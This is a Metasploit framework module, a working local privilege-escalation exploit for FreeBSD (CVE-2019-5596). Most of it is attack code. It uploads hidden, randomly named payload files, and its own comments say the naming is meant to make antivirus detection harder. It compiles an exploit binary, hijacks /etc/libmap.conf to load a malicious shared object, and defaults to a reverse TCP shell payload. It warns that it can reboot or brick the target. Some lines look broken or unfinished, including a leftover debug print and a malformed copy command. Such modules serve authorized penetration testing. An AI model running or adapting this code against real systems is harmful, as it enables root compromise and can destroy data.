##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = AverageRanking

  include Msf::Post::Linux::Priv
  include Msf::Post::Linux::Compile
  include Msf::Post::File
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'           => 'FreeBSD File Descriptor Ref Count Priv Esc',
        'Description'    => %q(
          FreeBSD 12.0 attempts to handle the case where the receiving process does
          not provide a sufficiently large buffer for an incoming control message
          containing rights.  In particular, to avoid leaking the corresponding
          descriptors into the receiving process' descriptor table, the kernel handles
          the truncation case by closing descriptors referenced by the discarded
          message.

          The code which performs this operation failed to release a reference obtained
          on the file corresponding to a received right.  This bug can be used to cause
          the reference counter to wrap around and free the file structure.

          Exploitation results in write access to /etc/libmap.conf where a new dynamic
          object is added which includes our payload.

          WARNING: Canceling execution of this exploit may case a system reboot,
          or cause the system to brick.  If the system reboots, artifacts will
          remain on disk and require manual cleanup.
        ),
        'License'        => MSF_LICENSE,
        'Author'         =>
          [
            'h00die', # msf module
            'Peter Holm', # original analysis
            'Karsten KÃ¶nig' # poc and edb module
          ],
        'Platform'       => [ 'bsd' ],
        'Arch'           => [ ARCH_X64, ARCH_CMD ],
        'SessionTypes'   => [ 'shell', 'meterpreter' ],
        'Targets'        => [[ 'Auto', {} ]],
        'Privileged'     => true,
        'References'     =>
          [
            [ 'EDB', '47829' ],
            [ 'URL', 'https://www.freebsd.org/security/advisories/FreeBSD-SA-19:02.fd.asc'],
            [ 'CVE', '2019-5596']
          ],
        'Notes'         => {
          'Stability'   => [CRASH_OS_RESTARTS],
          'SideEffects' => [ARTIFACTS_ON_DISK, IOC_IN_LOGS, SCREEN_EFFECTS]
        },
        'DefaultOptions' => {
          'WfsDelay' => 3600, # 60min
          'PAYLOAD' => 'bsd/x64/shell_reverse_tcp'
        },
        'DisclosureDate' => "Feb 05 2019",
        'DefaultTarget'  => 0
      )
    )
    register_options [
      OptEnum.new('COMPILE', [ true, 'Compile on target', 'Auto', %w[Auto True False] ])
    ]
    # force exploit is used to bypass the check command results
    register_advanced_options [
      OptInt.new('Forks',  [ false, 'Number of forks to use', 3 ]),
      OptBool.new('ForceExploit',  [ false, 'Override check result', false ]),
      OptInt.new('Threads',  [ false, 'Number of threads to use', 400 ]),
      OptString.new('WritableDir', [ true, 'A directory where we can write files', '/tmp' ])
    ]

  end

  # Simplify pulling the writable directory variable
  def base_dir
    datastore['WritableDir'].to_s
  end

  # Simplify and standardize uploading a file
  def upload(path, data)
    print_status "Writing '#{path}' (#{data.size} bytes) ..."
    write_file path, data
  end

  # Simplify uploading and chmoding a file
  def upload_and_chmodx(path, data)
    upload path, data
    chmod path
    register_file_for_cleanup path
  end

  # Simplify uploading and compiling a file
  def upload_and_compile(path, data, cc_cmd='')
    upload "#{path}.c", data

    if session.type.eql? 'shell'
      cc_cmd = "PATH=$PATH:/usr/bin/ #{cc_cmd}"
    end

    output = cmd_exec cc_cmd

    unless output.blank?
      print_error output
      fail_with Failure::Unknown, "#{path}.c failed to compile"
    end

    register_file_for_cleanup path
    chmod path
  end

  def has_cc?
    command_exists? 'cc'
  rescue
    raise 'Unable to check for cc'
  end

  # Pull the exploit binary or file (.c typically) from our system
  def exploit_data(file)
    ::File.binread ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2019-5596', file)
  end

  # If we're going to live compile on the system, check cc is installed
  def live_compile?
    return false unless datastore['COMPILE'].eql?('Auto') || datastore['COMPILE'].eql?('True')

    if has_cc?
      vprint_good 'cc is installed'
      return true
    end

    unless datastore['COMPILE'].eql? 'Auto'
      fail_with Failure::BadConfig, 'cc is not installed. Compiling will fail.'
    end
  end

  def check
    # Check the kernel version to see if its in a vulnerable range
    release = cmd_exec('/sbin/sysctl kern.version').split(' ')
    major = release[2]
    rev = Gem::Version.new(release[3].delete('r'))

    if major.include? '12'
      if major.include? 'STABLE' and rev > Gem::Version.new('343781')
        vprint_error("FreeBSD release #{major} rev r#{rev} is not vulnerable.")
        return CheckCode::Safe
      end
      if major.include? 'RELEASE' and rev >= Gem::Version.new('343790')
        vprint_error("FreeBSD release #{major} rev r#{rev} is not vulnerable.")
        return CheckCode::Safe
      end
    elsif major.include? '11' and (rev <= Gem::Version.new('338618') or rev >= Gem::Version.new('343786'))
      vprint_error("FreeBSD release #{major} rev r#{rev} is not vulnerable.")
      return CheckCode::Safe
    else
      vprint_error("FreeBSD release #{major} rev r#{rev} is not vulnerable.")
      return CheckCode::Safe
    end

    if not file?('/etc/libmap.conf')
      vprint_error('File /etc/libmap.conf not found, and is required for exploitation.')
      return CheckCode::Safe
    end

    maxfiles = cmd_exec('sysctl kern.maxfiles').split(' ')[1]
    if maxfiles.to_i < 64303
      vprint_error('In testing, when kern.maxfiles is < 60000 the exploit will most likely fail and reboot the system.')
      return CheckCode::Detected #detected, it is vuln, but not exploitable from our testing, but maybe for others?
    end

    vprint_good "FreeBSD release #{major} rev r#{rev} with maxfiles #{maxfiles} is vulnerable"
    CheckCode::Vulnerable
  end

  def exploit
    unless check == CheckCode::Vulnerable
      unless datastore['ForceExploit']
        fail_with Failure::NotVulnerable, 'Target is not vulnerable. Set ForceExploit to override.'
      end
      print_warning 'Target does not appear to be vulnerable'
    end

    # Check if we're already root
    if is_root?
      unless datastore['ForceExploit']
        fail_with Failure::BadConfig, 'Session already has root privileges. Set ForceExploit to override'
      end
    end

    # Make sure we can write our exploit and payload to the remote system
    unless writable? base_dir
      fail_with Failure::BadConfig, "#{base_dir} is not writable"
    end

    libmap = read_file('/etc/libmap.conf')
    p = store_loot('libmap.conf', 'text/plain', datastore['RHOST'], libmap, 'Backup of libmap.conf')
    print_status 'Stored /etc/libmap.conf in loot.  If session cleanup is unsuccessful, system will brick. Use this to unbrick'

    # Upload payload executable
    payload_path = "#{base_dir}/.#{rand_text_alphanumeric(5..10)}"
    upload_and_chmodx payload_path, generate_payload_exe

    # Upload exploit executable, writing to a random name so AV doesn't have too easy a job
    executable_name = ".#{rand_text_alphanumeric(5..10)}"
    executable_path = "#{base_dir}/#{executable_name}"
    stub_name = ".#{rand_text_alphanumeric(5..10)}"
    stub_path = "#{base_dir}/#{stub_name}"
    if live_compile?
      vprint_status 'Live compiling exploit on system...'
      hcw = exploit_data('heavy_cyber_weapon.c').gsub('/tmp/', "#{base_dir}/")
      hcw = hcw.gsub('#define NUM_THREADS 400', "#define NUM_THREADS #{datastore['Threads']}")
      hcw = hcw.gsub('#define NUM_FORKSS 3', "#define NUM_FORKS #{datastore['Forks']}")
      upload_and_compile executable_path, strip_comments(hcw), "cc -o #{executable_path} -lpthread #{executable_path}.c"
      rm_f "#{executable_path}.c"
      #stub = exploit_data('program.c').gsub('/tmp/xxxx', payload_path)
      stub = exploit_data('program.c')
      upload_and_compile stub_path, strip_comments(stub), "cc -o #{stub_path}.o -c #{stub_path}.c -fPIC"
      cmd_exec "cc -shared -Wl,-soname,libno_ex.so.1 -o #{base_dir}/libno_ex.so.1.0 #{stub_path}.o -nostartfiles"
      rm_f "#{stub_path}.c"
      rm_f "#{stub_path}.o"

      runner_name = ".#{rand_text_alphanumeric(5..10)}.sh"
      runner_path = "#{base_dir}/#{runner_name}"
      runner = %Q{
#!/bin/bash
cp /etc/libmap.conf #{base_dir}/libmap.conf
#{executable_path}
su
/tmp/xxxx -c #{payload_path}&
}
      upload_and_chmodx runner_path, runner
    else
      vprint_status 'Dropping pre-compiled exploit on system...'
      vprint_error 'not created yet'
      return 0
      #upload_and_chmodx executable_path, exploit_data('example')
    end

    # Launch exploit with a timeout.  We also have a vprint_status so if the user wants all the
    # output from the exploit being run, they can optionally see it
    timeout = 3600 #60min
    print_status "Launching exploit... May take 50-60 minutes. Start time: #{Time.now}"
    cmd_exec "cd #{base_dir}"
    puts 'XXX dont forget output redirect'
    output = cmd_exec "#{runner_path} > /tmp/output" , nil, timeout
    output.each_line { |line| vprint_status line.chomp }
  end

  def on_new_session(session)
    super
    print_status 'Performing Cleanup'
    ['/tmp/dummy', '/tmp/dummy2', '/tmp/pwn', '/tmp/pwn2', '/tmp/sync_forks*'].each do |clean|
      rm_f clean
    end

    print_good 'Replacing /etc/libmap.conf with looted one to prevent bricking system'
    write_file '/etc/libmap.conf', libmap
    cmd_exec "/bin/cp #{base_dir/libmap.conf} /etc/libmap.conf"
  end
end
